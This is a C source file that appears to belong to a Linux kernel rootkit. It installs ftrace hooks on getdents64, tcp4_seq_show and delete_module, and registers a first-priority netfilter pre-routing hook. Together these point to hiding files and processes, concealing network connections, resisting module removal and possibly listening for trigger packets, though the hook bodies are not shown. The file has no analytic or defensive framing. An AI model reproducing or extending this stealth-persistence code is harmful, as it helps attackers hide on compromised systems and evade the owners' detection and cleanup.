#include "ftrace.h"

#include "hooks/hook_getdents64.h"
#include "hooks/hook_tcp4_seq_show.h"
#include "hooks/hook_delete_module.h"
#include "hooks/hook_ip.h"

static struct ftrace_hook hooks[] = {
    {"__x64_sys_getdents64", hook_getdents64, &getdents64},
    {"tcp4_seq_show", hook_tcp4_seq_show, &tcp4_seq_show},
    {"__x64_sys_delete_module", hook_delete_module, &delete_module}};

static struct nf_hook_ops hook_netfilter = {
    .hook = hook_ip,
    .hooknum = NF_INET_PRE_ROUTING,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST,
};

int install_hooks(void)
{
    nf_register_net_hook(&init_net, &hook_netfilter);

    int hook_count = ARRAY_SIZE(hooks);
    int err;

    for (int i = 0; i < hook_count; i++)
    {
        err = fh_install_hook(&hooks[i]);

        if (err)
        {
            while (i > 0)
                fh_remove_hook(&hooks[--i]);

            return err;
        }
    }

    return 0;
}

void uninstall_hooks(void)
{
    nf_unregister_net_hook(&init_net, &hook_netfilter);

    int hook_count = ARRAY_SIZE(hooks);

    for (int i = 0; i < hook_count; i++)
        fh_remove_hook(&hooks[i]);
}